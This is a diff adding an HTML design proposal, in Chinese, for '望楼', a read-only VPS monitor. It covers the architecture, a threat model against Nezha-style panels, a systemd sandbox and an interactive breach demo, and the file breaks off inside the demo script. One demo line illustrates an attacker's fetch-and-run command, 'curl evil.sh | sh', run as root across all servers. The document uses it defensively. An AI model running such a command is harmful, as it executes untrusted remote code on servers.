@@ -1,0 +1,670 @@
+<title>望楼监控</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans+Condensed:wght@500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap">
+<style>
+/* Layout: 单栏技术方案，左对齐 840px 文本轨；交互区与架构图放宽到 1080px；数据一律等宽字体 */
+:root {
+  --bg: #F1F3F5;
+  --surface: #FFFFFF;
+  --ink: #16212C;
+  --muted: #5A6775;
+  --line: #D6DCE2;
+  --accent: #1D5BC8;
+  --accent-soft: #E3ECFB;
+  --ok: #1D8754;
+  --warn: #A86C12;
+  --crit: #C3352B;
+  --ok-soft: #E2F3EA;
+  --warn-soft: #FBF0DC;
+  --crit-soft: #FBE5E3;
+  --code-bg: #E8ECF0;
+  --f-display: "IBM Plex Sans Condensed", "Noto Sans SC", "PingFang SC", system-ui, sans-serif;
+  --f-body: "Noto Sans SC", "PingFang SC", "Microsoft YaHei", system-ui, sans-serif;
+  --f-mono: "IBM Plex Mono", ui-monospace, "SF Mono", Menlo, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #10161C; --surface: #172029; --ink: #E3E9EF; --muted: #8E9DAB; --line: #29343F;
+    --accent: #6E9EFF; --accent-soft: #1B2A44;
+    --ok: #46BE85; --warn: #E2A84B; --crit: #F06A5F;
+    --ok-soft: #15301F; --warn-soft: #33270F; --crit-soft: #3A1A18;
+    --code-bg: #0C1217; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #10161C; --surface: #172029; --ink: #E3E9EF; --muted: #8E9DAB; --line: #29343F;
+  --accent: #6E9EFF; --accent-soft: #1B2A44;
+  --ok: #46BE85; --warn: #E2A84B; --crit: #F06A5F;
+  --ok-soft: #15301F; --warn-soft: #33270F; --crit-soft: #3A1A18;
+  --code-bg: #0C1217; color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+body {
+  background: var(--bg); color: var(--ink);
+  font-family: var(--f-body); font-size: 15.5px; line-height: 1.75;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  padding-block: 0 72px;
+}
+.wrap { max-width: 1080px; margin: 0 auto; display: grid; gap: 64px; }
+.prose { max-width: 760px; }
+h1, h2, h3 { font-family: var(--f-display); text-wrap: balance; margin: 0; line-height: 1.25; }
+h2 { font-size: 26px; font-weight: 700; }
+h3 { font-size: 17px; font-weight: 600; }
+p { margin: 0; }
+code, .mono { font-family: var(--f-mono); font-size: .9em; }
+.eyebrow { font-family: var(--f-mono); font-size: 12px; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
+section { display: grid; gap: 20px; }
+section > header { display: grid; gap: 8px; }
+section > header p { color: var(--muted); max-width: 680px; }
+
+/* hero */
+.hero { padding-top: 56px; display: grid; gap: 22px; }
+.brand { display: flex; align-items: baseline; gap: 14px; flex-wrap: wrap; }
+.brand h1 { font-size: clamp(40px, 7vw, 64px); font-weight: 700; letter-spacing: .02em; }
+.brand .latin { font-family: var(--f-mono); color: var(--muted); font-size: 15px; }
+.thesis { font-size: clamp(19px, 2.6vw, 24px); line-height: 1.6; max-width: 760px; font-weight: 500; }
+.thesis em { font-style: normal; color: var(--accent); }
+.flow-strip {
+  display: flex; flex-wrap: wrap; align-items: center; gap: 10px;
+  font-family: var(--f-mono); font-size: 13px;
+}
+.flow-strip .node { border: 1px solid var(--line); background: var(--surface); padding: 4px 10px; border-radius: 4px; }
+.flow-strip .arrow { color: var(--accent); }
+.flow-strip .no { color: var(--crit); }
+.specs { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
+.specs div { padding: 14px 16px 14px 0; display: grid; gap: 2px; }
+.specs div + div { padding-left: 16px; border-left: 1px solid var(--line); }
+.specs b { font-family: var(--f-mono); font-size: 22px; font-weight: 600; font-variant-numeric: tabular-nums; }
+.specs span { font-size: 13px; color: var(--muted); }
+@media (max-width: 640px) {
+  .specs { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  .specs div:nth-child(3) { padding-left: 0; border-left: 0; border-top: 1px solid var(--line); }
+  .specs div:nth-child(4) { border-top: 1px solid var(--line); }
+}
+.note-target { font-size: 12.5px; color: var(--muted); }
+
+/* principles */
+.principles { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 28px; }
+.principles article { display: grid; gap: 8px; align-content: start; }
+.principles .tag { font-family: var(--f-mono); font-size: 12px; color: var(--accent); }
+.principles p { color: var(--muted); font-size: 14.5px; }
+@media (max-width: 760px) { .principles { grid-template-columns: 1fr; gap: 20px; } }
+
+/* blast radius */
+.lab { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; display: grid; grid-template-columns: minmax(0, 1.25fr) minmax(0, 1fr); }
+.lab-stage { padding: 22px; display: grid; gap: 18px; border-right: 1px solid var(--line); }
+.lab-side { padding: 22px; display: grid; gap: 16px; align-content: start; }
+@media (max-width: 820px) { .lab { grid-template-columns: 1fr; } .lab-stage { border-right: 0; border-bottom: 1px solid var(--line); } }
+.controls { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; }
+.seg { display: inline-flex; border: 1px solid var(--line); border-radius: 6px; overflow: hidden; }
+.seg button {
+  font: 500 13.5px var(--f-body); padding: 7px 14px; border: 0; background: transparent; color: var(--muted); cursor: pointer;
+}
+.seg button + button { border-left: 1px solid var(--line); }
+.seg button[aria-pressed="true"] { background: var(--accent); color: var(--surface); }
+.btn {
+  font: 500 13.5px var(--f-body); padding: 7px 14px; border-radius: 6px; cursor: pointer;
+  border: 1px solid var(--line); background: var(--bg); color: var(--ink);
+}
+.btn.danger { border-color: var(--crit); color: var(--crit); background: transparent; }
+.btn.danger[aria-pressed="true"] { background: var(--crit); color: var(--surface); }
+button:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+.panel-box {
+  display: flex; justify-content: space-between; align-items: center; gap: 10px; flex-wrap: wrap;
+  border: 1.5px solid var(--line); border-radius: 6px; padding: 10px 14px; font-family: var(--f-mono); font-size: 13px;
+}
+.panel-box.hit { border-color: var(--crit); background: var(--crit-soft); }
+.grid-nodes { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 10px; }
+.n {
+  border: 1.5px solid var(--line); border-radius: 6px; padding: 10px 12px; text-align: left; cursor: pointer;
+  background: var(--surface); color: var(--ink); font-family: var(--f-mono); font-size: 13px; display: grid; gap: 2px;
+  transition: background .25s, border-color .25s;
+}
+.n small { font-family: var(--f-body); font-size: 12px; color: var(--muted); }
+.n.ok small::before { content: "● "; color: var(--ok); }
+.n.owned { border-color: var(--crit); background: var(--crit-soft); }
+.n.owned small { color: var(--crit); }
+.n.leak { border-color: var(--warn); background: var(--warn-soft); }
+.n.leak small { color: var(--warn); }
+.n.origin { box-shadow: inset 0 0 0 2px var(--crit); }
+.hint { font-size: 12.5px; color: var(--muted); }
+.count { display: flex; align-items: baseline; gap: 8px; }
+.count b { font-family: var(--f-mono); font-size: 44px; font-weight: 600; line-height: 1; font-variant-numeric: tabular-nums; }
+.count b.bad { color: var(--crit); }
+.count b.good { color: var(--ok); }
+.count span { color: var(--muted); font-size: 13.5px; }
+.verdict { font-size: 14.5px; }
+.verdict ul { margin: 8px 0 0; padding-left: 18px; color: var(--muted); }
+.legend { display: flex; flex-wrap: wrap; gap: 14px; font-size: 12.5px; color: var(--muted); }
+.legend i { display: inline-block; width: 10px; height: 10px; border-radius: 2px; margin-right: 6px; vertical-align: -1px; border: 1.5px solid; }
+.legend .l-ok { border-color: var(--line); }
+.legend .l-leak { border-color: var(--warn); background: var(--warn-soft); }
+.legend .l-owned { border-color: var(--crit); background: var(--crit-soft); }
+
+/* architecture */
+.diagram { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 18px; overflow-x: auto; }
+.diagram svg { display: block; width: 100%; min-width: 680px; height: auto; }
+.d-box { fill: var(--bg); stroke: var(--line); stroke-width: 1.5; }
+.d-box.key { fill: var(--accent-soft); stroke: var(--accent); }
+.d-box.out { fill: var(--surface); stroke: var(--line); stroke-dasharray: 4 3; }
+.d-t { fill: var(--ink); font: 600 13px var(--f-mono); }
+.d-s { fill: var(--muted); font: 400 11.5px var(--f-body); }
+.d-a { stroke: var(--accent); stroke-width: 1.75; fill: none; }
+.d-ah { fill: var(--accent); }
+.d-x { stroke: var(--crit); stroke-width: 1.5; fill: none; stroke-dasharray: 5 4; }
+.d-xt { fill: var(--crit); font: 500 11.5px var(--f-body); }
+.d-zone { fill: none; stroke: var(--line); stroke-dasharray: 2 4; }
+.d-zl { fill: var(--muted); font: 500 11px var(--f-mono); letter-spacing: .06em; }
+
+/* threat table */
+.table-wrap { overflow-x: auto; border: 1px solid var(--line); border-radius: 8px; background: var(--surface); }
+table { border-collapse: collapse; width: 100%; min-width: 720px; font-size: 14px; }
+th, td { text-align: left; vertical-align: top; padding: 12px 14px; border-bottom: 1px solid var(--line); }
+tr:last-child td { border-bottom: 0; }
+th { font: 600 12px var(--f-mono); letter-spacing: .05em; text-transform: uppercase; color: var(--muted); background: var(--bg); }
+td:first-child { font-weight: 500; width: 20%; }
+.pill { display: inline-block; font: 500 12px var(--f-body); padding: 1px 8px; border-radius: 99px; margin-bottom: 4px; }
+.pill.crit { background: var(--crit-soft); color: var(--crit); }
+.pill.warn { background: var(--warn-soft); color: var(--warn); }
+.pill.ok { background: var(--ok-soft); color: var(--ok); }
+td .why { color: var(--muted); display: block; font-size: 13.5px; }
+
+/* cuts */
+.cuts { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 0 32px; }
+.cuts div { padding: 14px 0; border-top: 1px solid var(--line); display: grid; gap: 4px; }
+.cuts h3 { font-size: 15.5px; }
+.cuts h3 s { text-decoration-color: var(--crit); text-decoration-thickness: 2px; }
+.cuts p { color: var(--muted); font-size: 14px; }
+@media (max-width: 700px) { .cuts { grid-template-columns: 1fr; } }
+
+/* spec */
+.spec { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 24px; }
+@media (max-width: 860px) { .spec { grid-template-columns: 1fr; } }
+.spec-col { display: grid; gap: 12px; align-content: start; min-width: 0; }
+pre {
+  margin: 0; background: var(--code-bg); border: 1px solid var(--line); border-radius: 6px;
+  padding: 14px 16px; overflow-x: auto; font: 12.5px/1.65 var(--f-mono); color: var(--ink);
+}
+pre .c { color: var(--muted); }
+pre .k { color: var(--accent); }
+.kv { display: grid; grid-template-columns: auto 1fr; gap: 6px 16px; font-size: 14px; margin: 0; }
+.kv dt { font-family: var(--f-mono); font-size: 13px; color: var(--muted); }
+.kv dd { margin: 0; }
+
+/* enroll steps */
+.steps { list-style: none; padding: 0; margin: 0; display: grid; gap: 0; counter-reset: s; }
+.steps li { counter-increment: s; display: grid; grid-template-columns: 36px 1fr; gap: 12px; padding: 12px 0; border-top: 1px solid var(--line); }
+.steps li::before { content: counter(s); font: 600 14px var(--f-mono); color: var(--accent); }
+.steps li p { color: var(--muted); font-size: 14px; }
+.steps li h3 { font-size: 15px; }
+
+/* mock dashboard */
+.mock { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; overflow: hidden; }
+.mock-bar { display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; padding: 12px 16px; border-bottom: 1px solid var(--line); font-size: 13px; }
+.mock-bar .mono { color: var(--muted); }
+.mock-sum { display: flex; gap: 18px; flex-wrap: wrap; }
+.mock-sum span b { font-family: var(--f-mono); font-variant-numeric: tabular-nums; }
+.dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+.dot.ok { background: var(--ok); } .dot.warn { background: var(--warn); } .dot.crit { background: var(--crit); }
+.alert-row { display: flex; gap: 10px; align-items: flex-start; padding: 10px 16px; background: var(--warn-soft); border-bottom: 1px solid var(--line); font-size: 13.5px; }
+.alert-row .mono { color: var(--warn); white-space: nowrap; }
+.rows { display: grid; }
+.row {
+  display: grid; grid-template-columns: minmax(130px, 1.2fr) repeat(3, minmax(0, 1fr)) minmax(90px, .8fr);
+  gap: 16px; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--line); font-size: 13px;
+}
+.row:last-child { border-bottom: 0; }
+.row.head { font: 600 11.5px var(--f-mono); color: var(--muted); letter-spacing: .05em; text-transform: uppercase; background: var(--bg); padding-block: 8px; }
+.row .name b { font-family: var(--f-mono); font-weight: 600; }
+.row .name small { display: block; color: var(--muted); font-size: 12px; }
+.meter { display: grid; gap: 4px; font-family: var(--f-mono); font-variant-numeric: tabular-nums; }
+.meter .track { height: 5px; background: var(--code-bg); border-radius: 3px; overflow: hidden; }
+.meter .fill { height: 100%; background: var(--accent); border-radius: 3px; }
+.meter .fill.hot { background: var(--warn); }
+.row svg { width: 100%; height: 28px; display: block; }
+.spark-area { fill: var(--accent-soft); }
+.spark-line { fill: none; stroke: var(--accent); stroke-width: 1.5; }
+.spark-dot { fill: var(--accent); }
+.net { font-family: var(--f-mono); font-variant-numeric: tabular-nums; color: var(--muted); font-size: 12px; }
+.row.stale { opacity: .62; }
+@media (max-width: 760px) {
+  .row { grid-template-columns: 1fr 1fr; }
+  .row.head { display: none; }
+  .row .name { grid-column: 1 / -1; }
+}
+.sample { font-size: 12.5px; color: var(--muted); padding: 10px 16px; border-top: 1px solid var(--line); background: var(--bg); }
+
+/* roadmap */
+.road { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 24px; }
+.road div { display: grid; gap: 6px; align-content: start; }
+.road h3 { font-size: 15.5px; }
+.road ul { margin: 0; padding-left: 18px; color: var(--muted); font-size: 14px; }
+@media (max-width: 760px) { .road { grid-template-columns: 1fr; } }
+
+footer { color: var(--muted); font-size: 13px; border-top: 1px solid var(--line); padding-top: 16px; }
+
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+
+<div class="wrap">
+
+  <header class="hero">
+    <div class="eyebrow">VPS 监控 · 设计方案 v0.1</div>
+    <div class="brand"><h1>望楼</h1><span class="latin">wanglou · read-only server monitor</span></div>
+    <p class="thesis">一个只看不碰的服务器监控。探针只往外发数据，<em>没有任何入口能让面板在你的机器上执行命令</em>。面板被攻破，最坏结果是监控数据泄露；某台 VPS 被攻破，影响停在那一台。</p>
+    <div class="flow-strip" aria-label="数据流向">
+      <span class="node">agent</span><span class="arrow">──签名上报──▶</span><span class="node">接收端</span><span class="arrow">──▶</span><span class="node">SQLite</span><span class="arrow">──▶</span><span class="node">只读面板 / 告警</span>
+      <span class="no">　◀── 下行通道：不存在</span>
+    </div>
+    <div class="specs">
+      <div><b>~3 MB</b><span>agent 静态二进制</span></div>
+      <div><b>&lt;8 MB</b><span>agent 常驻内存</span></div>
+      <div><b>0</b><span>agent 监听端口</span></div>
+      <div><b>0</b><span>可远程执行的接口</span></div>
+    </div>
+    <p class="note-target">以上为设计目标，非实测数据。</p>
+  </header>
+
+  <section>
+    <header>
+      <div class="eyebrow">三条原则</div>
+      <h2>安全来自没有那个功能</h2>
+    </header>
+    <div class="principles">
+      <article>
+        <span class="tag">单向数据流</span>
+        <h3>探针只出不进</h3>
+        <p>agent 主动发起 HTTPS 上报，不开端口、不保持可被利用的长连接下行指令。服务端的响应只有 <code>204</code> 或 <code>4xx</code>，agent 不解析任何响应体。</p>
+      </article>
+      <article>
+        <span class="tag">每节点独立密钥</span>
+        <h3>拿到一把钥匙只能开一扇门</h3>
+        <p>每台机器本地生成 Ed25519 密钥对，私钥不离开本机。服务端只存公钥。泄露一台的私钥，只能伪造这一台的数据。</p>
+      </article>
+      <article>
+        <span class="tag">最小权限</span>
+        <h3>探针不需要 root</h3>
+        <p>CPU、内存、磁盘、网络都能从 <code>/proc</code> 和 <code>statfs</code> 读到。agent 以专用无权限用户运行，systemd 沙箱锁死文件系统和能力集。</p>
+      </article>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">爆炸半径对比</div>
+      <h2>同一次入侵，两种架构的后果</h2>
+      <p>切换架构，然后点“攻破面板”或直接点任意一台机器模拟它被入侵。哪吒式指带 Web 终端、远程命令和计划任务下发的监控面板。</p>
+    </header>
+    <div class="lab">
+      <div class="lab-stage">
+        <div class="controls">
+          <div class="seg" role="group" aria-label="架构">
+            <button id="arch-nezha" type="button" aria-pressed="true">哪吒式（可下发命令）</button>
+            <button id="arch-wl" type="button" aria-pressed="false">望楼（只读）</button>
+          </div>
+          <button id="hit-panel" class="btn danger" type="button" aria-pressed="false">攻破面板</button>
+          <button id="reset" class="btn" type="button">复位</button>
+        </div>
+        <div id="panel-box" class="panel-box"><span>面板 · mon.example.com</span><span id="panel-state">正常</span></div>
+        <div id="nodes" class="grid-nodes"></div>
+        <div class="legend">
+          <span><i class="l-ok"></i>正常</span>
+          <span><i class="l-leak"></i>数据可见 / 可被伪造显示</span>
+          <span><i class="l-owned"></i>攻击者可执行命令</span>
+        </div>
+      </div>
+      <div class="lab-side" aria-live="polite">
+        <div class="eyebrow">攻击者能控制的机器</div>
+        <div class="count"><b id="owned-n">0</b><span>/ 9 台</span></div>
+        <div id="verdict" class="verdict"></div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">架构</div>
+      <h2>三个进程，一个方向</h2>
+      <p>接收端和面板可以是同一个二进制的两个端口。推荐把面板放在 Cloudflare Access、Tailscale 或 Basic Auth 后面，接收端单独暴露。</p>
+    </header>
+    <div class="diagram">
+      <svg viewBox="0 0 900 330" role="img" aria-label="望楼架构：多个 agent 通过签名 HTTPS 单向上报到接收端，写入 SQLite，再由只读面板和告警模块读取；不存在从服务端到 agent 的下行通道">
+        <defs>
+          <marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path class="d-ah" d="M0,0 L10,5 L0,10 z"/></marker>
+        </defs>
+        <rect class="d-zone" x="10" y="20" width="220" height="290" rx="8"/>
+        <text class="d-zl" x="24" y="40">你的 VPS × N</text>
+        <rect class="d-zone" x="300" y="20" width="580" height="290" rx="8"/>
+        <text class="d-zl" x="314" y="40">监控主机（单二进制）</text>
+
+        <rect class="d-box" x="30" y="60" width="180" height="56" rx="6"/>
+        <text class="d-t" x="44" y="84">agent · hk-01</text>
+        <text class="d-s" x="44" y="104">uid=wanglou · 无监听端口</text>
+        <rect class="d-box" x="30" y="136" width="180" height="56" rx="6"/>
+        <text class="d-t" x="44" y="160">agent · tyo-01</text>
+        <text class="d-s" x="44" y="180">私钥只在本机</text>
+        <rect class="d-box" x="30" y="212" width="180" height="56" rx="6"/>
+        <text class="d-t" x="44" y="236">agent · fra-01</text>
+        <text class="d-s" x="44" y="256">读 /proc · statfs · wtmp</text>
+
+        <path class="d-a" d="M210,88 C260,88 270,150 330,160" marker-end="url(#ah)"/>
+        <path class="d-a" d="M210,164 L330,164" marker-end="url(#ah)"/>
+        <path class="d-a" d="M210,240 C260,240 270,178 330,168" marker-end="url(#ah)"/>
+        <text class="d-s" x="232" y="132">HTTPS POST</text>
+        <text class="d-s" x="232" y="148">Ed25519 签名</text>
+
+        <path class="d-x" d="M330,206 C280,220 260,262 214,270"/>
+        <line class="d-x" x1="262" y1="232" x2="280" y2="250" style="stroke-dasharray:none"/>
+        <line class="d-x" x1="280" y1="232" x2="262" y2="250" style="stroke-dasharray:none"/>
+        <text class="d-xt" x="236" y="292">无下行通道</text>
+
+        <rect class="d-box key" x="332" y="124" width="160" height="80" rx="6"/>
+        <text class="d-t" x="346" y="150">接收端 :8443</text>
+        <text class="d-s" x="346" y="170">验签 · 防重放</text>
+        <text class="d-s" x="346" y="188">按节点限流</text>
+
+        <path class="d-a" d="M492,164 L548,164" marker-end="url(#ah)"/>
+        <rect class="d-box" x="550" y="134" width="120" height="60" rx="6"/>
+        <text class="d-t" x="564" y="160">SQLite</text>
+        <text class="d-s" x="564" y="180">WAL · 自动降采样</text>
+
+        <path class="d-a" d="M670,150 C700,150 700,92 726,92" marker-end="url(#ah)"/>
+        <path class="d-a" d="M670,178 C700,178 700,236 726,236" marker-end="url(#ah)"/>
+        <rect class="d-box" x="728" y="60" width="136" height="64" rx="6"/>
+        <text class="d-t" x="742" y="86">面板 :8080</text>
+        <text class="d-s" x="742" y="106">只读 · 登录 + TOTP</text>
+        <rect class="d-box" x="728" y="204" width="136" height="64" rx="6"/>
+        <text class="d-t" x="742" y="230">告警</text>
+        <text class="d-s" x="742" y="250">Telegram · Webhook</text>
+      </svg>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">威胁模型</div>
+      <h2>四种入侵场景</h2>
+    </header>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>场景</th><th>哪吒式面板</th><th>望楼</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>面板被攻破<br><span class="why">弱口令、0day、OAuth 配置错误</span></td>
+            <td><span class="pill crit">全部失守</span><span class="why">Web 终端、计划任务、命令下发都以 agent 权限执行，通常是 root。一次入侵波及每一台机器。</span></td>
+            <td><span class="pill warn">数据泄露</span><span class="why">攻击者能看 IP、配置和历史指标，能篡改面板显示。没有任何接口能触达 agent，机器本身安全。</span></td>
+          </tr>
+          <tr>
+            <td>单台 VPS 被攻破</td>
+            <td><span class="pill warn">视密钥设计而定</span><span class="why">若所有 agent 共用一个密钥，攻击者可冒充任意节点上报。</span></td>
+            <td><span class="pill ok">止于该机</span><span class="why">只拿到这一台的私钥。新 SSH 登录、agent 二进制哈希变化、失联都会触发告警。</span></td>
+          </tr>
+          <tr>
+            <td>传输被劫持</td>
+            <td><span class="pill warn">取决于 TLS 配置</span><span class="why">gRPC 明文模式下指令可被注入。</span></td>
+            <td><span class="pill ok">无可注入内容</span><span class="why">agent 不执行收到的任何东西。请求体签名，时间戳 ±60 秒 + 递增序号防重放。</span></td>
+          </tr>
+          <tr>
+            <td>更新渠道被投毒</td>
+            <td><span class="pill crit">全部失守</span><span class="why">面板触发 agent 自动更新时，换一个二进制就是全网 RCE。</span></td>
+            <td><span class="pill ok">需要离线签名密钥</span><span class="why">agent 不自更新。通过 apt/rpm 仓库或手动下载升级，包由离线保存的发布密钥签名。</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">刻意不做的功能</div>
+      <h2>砍掉的东西，就是被拿走的攻击面</h2>
+      <p>这些功能需要面板到 agent 的下行通道。需要时请用 SSH、Ansible 等独立鉴权的工具。</p>
+    </header>
+    <div class="cuts">
+      <div><h3><s>Web 终端</s></h3><p>等于把 root shell 挂在网页上。用 SSH + 密钥 + fail2ban。</p></div>
+      <div><h3><s>远程命令 / 计划任务</s></h3><p>批量执行是攻击者最想要的能力。用 Ansible 从你的本地机器发起。</p></div>
+      <div><h3><s>文件管理</s></h3><p>任意读写需要高权限。agent 只读 /proc，碰不到你的文件。</p></div>
+      <div><h3><s>面板触发的自动更新</s></h3><p>更新走系统包管理器，由离线密钥签名，不受面板控制。</p></div>
+      <div><h3><s>agent 端配置下发</s></h3><p>上报间隔等配置写在本机 <code>/etc/wanglou/agent.toml</code>，只有 root 可改。</p></div>
+      <div><h3><s>内网穿透 / 端口转发</s></h3><p>与监控无关，且会让 agent 变成跳板。</p></div>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">agent 规格</div>
+      <h2>上报协议与沙箱</h2>
+    </header>
+    <div class="spec">
+      <div class="spec-col">
+        <h3>一次上报（默认每 5 秒）</h3>
+<pre><span class="k">POST</span> /v1/report HTTP/1.1
+Host: ingest.example.com
+X-Node:  hk-01
+X-Seq:   184467
+X-Ts:    1761552003
+X-Sig:   ed25519:9f3a6c…e1  <span class="c"># 签名覆盖 node|seq|ts|sha256(body)</span>
+
+{"cpu":12.4,"load":[0.21,0.18,0.12],
+ "mem":[812,2048],"swap":[0,512],
+ "disk":[18.2,40.0],"net":[1532,8841],
+ "conn":[41,6],"up":864000,
+ "login":[{"u":"root","from":"203.0.113.7","t":1761551990}],
+ "bin":"sha256:4b1e…"}</pre>
+        <dl class="kv">
+          <dt>net</dt><dd>上行 / 下行，单位 bytes/s</dd>
+          <dt>conn</dt><dd>TCP / UDP 连接数</dd>
+          <dt>login</dt><dd>自上次上报以来的新登录，读自 wtmp</dd>
+          <dt>bin</dt><dd>agent 自身二进制哈希，被替换即告警</dd>
+        </dl>
+      </div>
+      <div class="spec-col">
+        <h3>systemd 单元</h3>
+<pre>[Service]
+User=wanglou
+ExecStart=/usr/local/bin/wanglou-agent
+<span class="c"># 沙箱</span>
+NoNewPrivileges=yes
+ProtectSystem=strict
+ProtectHome=yes
+PrivateTmp=yes
+PrivateDevices=yes
+CapabilityBoundingSet=
+RestrictAddressFamilies=AF_INET AF_INET6
+SystemCallFilter=@system-service
+SystemCallFilter=~@privileged @resources
+<span class="c"># 资源上限</span>
+MemoryMax=24M
+CPUQuota=5%
+Restart=always</pre>
+        <p class="note-target">私钥存放于 <code>/etc/wanglou/node.key</code>，属主 wanglou，权限 0400。agent 被杀或失联超过 3 个周期，服务端告警。</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">接入一台新机器</div>
+      <h2>私钥从不经过网络</h2>
+    </header>
+    <ol class="steps">
+      <li><div><h3>在 VPS 上安装并生成密钥</h3><p><code>wanglou-agent init --name hk-01</code> 在本机生成 Ed25519 密钥对，打印公钥指纹。</p></div></li>
+      <li><div><h3>在面板登记公钥</h3><p>粘贴公钥，或使用 10 分钟有效、只能用一次的注册码让 agent 提交公钥。注册码只能登记公钥，不能做任何其他事。</p></div></li>
+      <li><div><h3>核对指纹后启用</h3><p>面板显示指纹，与第 1 步输出一致才点启用。之后该节点只接受这把公钥签名的数据。</p></div></li>
+      <li><div><h3>吊销</h3><p>机器疑似被入侵时在面板吊销其公钥，该节点数据立即被拒收，其他节点不受影响。</p></div></li>
+    </ol>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">面板预览</div>
+      <h2>一屏看清所有机器</h2>
+    </header>
+    <div class="mock">
+      <div class="mock-bar">
+        <div class="mock-sum">
+          <span><span class="dot ok"></span>在线 <b>5</b></span>
+          <span><span class="dot warn"></span>注意 <b>1</b></span>
+          <span><span class="dot crit"></span>失联 <b>1</b></span>
+        </div>
+        <span class="mono">10-27 14:32:05 · 每 5s 刷新</span>
+      </div>
+      <div class="alert-row"><span class="mono">14:31:40</span><span>tyo-01 新 SSH 登录：root 来自 203.0.113.7。不是你本人？请在面板吊销该节点并登录检查。</span></div>
+      <div class="rows" id="rows"></div>
+      <div class="sample">示例数据，用于展示布局。</div>
+    </div>
+  </section>
+
+  <section>
+    <header>
+      <div class="eyebrow">技术选型与路线</div>
+      <h2>从能用到好用</h2>
+    </header>
+    <div class="road">
+      <div>
+        <h3>M1 · 能跑</h3>
+        <ul>
+          <li>Go 写 agent，CGO 关闭，静态编译 amd64 / arm64</li>
+          <li>服务端 Go + SQLite，前端静态文件嵌入二进制</li>
+          <li>Ed25519 验签、防重放、失联告警、Telegram 推送</li>
+        </ul>
+      </div>
+      <div>
+        <h3>M2 · 好用</h3>
+        <ul>
+          <li>SSH 登录告警、二进制哈希告警</li>
+          <li>1 分钟 / 1 小时降采样，默认保留 90 天</li>
+          <li>公开状态页（可选，脱敏 IP）</li>
+        </ul>
+      </div>
+      <div>
+        <h3>M3 · 更稳</h3>
+        <ul>
+          <li>双接收端：agent 同时上报两个地址，一个被拿下仍有告警</li>
+          <li>外部心跳：接收端定时 ping Healthchecks 类服务，面板挂了也会知道</li>
+          <li>apt / rpm 签名仓库</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <footer>望楼 · 设计方案草稿。威胁模型中关于哪吒的描述基于其公开功能（Web 终端、命令下发、计划任务、自动更新），具体风险取决于部署配置。</footer>
+</div>
+
+<script>
+(function () {
+  var names = ["hk-01", "hk-02", "tyo-01", "sg-01", "la-01", "fra-01", "ams-01", "sh-01", "bj-01"];
+  var state = { arch: "nezha", panel: false, node: null };
+  var nodesEl = document.getElementById("nodes");
+  var btnN = document.getElementById("arch-nezha");
+  var btnW = document.getElementById("arch-wl");
+  var btnP = document.getElementById("hit-panel");
+
+  function status(i) {
+    var isOrigin = state.node === i;
+    if (state.arch === "nezha") {
+      if (state.panel) return "owned";
+      if (isOrigin) return "owned";
+      return "ok";
+    }
+    if (isOrigin) return "owned";
+    if (state.panel) return "leak";
+    return "ok";
+  }
+  var label = { ok: "正常", leak: "数据可见", owned: "已失守" };
+
+  function verdict(owned) {
+    var a = state.arch, v = "";
+    if (!state.panel && state.node === null) {
+      v = "<p>选择一个攻击目标。</p>";
+    } else if (a === "nezha" && state.panel) {
+      v = "<p>攻击者在面板里打开 Web 终端，或建一个计划任务对所有服务器执行：</p><ul><li><code>curl evil.sh | sh</code> 以 root 运行在 9 台机器上</li><li>植入后门、挖矿、删库，全部同时发生</li><li>告警也由这个面板发出，可以先关掉</li></ul>";
+    } else if (a === "nezha") {
+      v = "<p>" + names[state.node] + " 失守。其他机器不能被直接控制，但：</p><ul><li>如果全网共用一个 agent 密钥，攻击者可冒充任意节点上报假数据</li><li>agent 通常以 root 运行，被替换后无人察觉</li></ul>";
+    } else if (state.panel && state.node !== null) {
+      v = "<p>面板与 " + names[state.node] + " 同时失守，控制范围仍只有 1 台：</p><ul><li>面板没有通往其他 agent 的通道</li><li>开启双接收端时，第二个接收端仍会发出告警</li></ul>";
+    } else if (state.panel) {
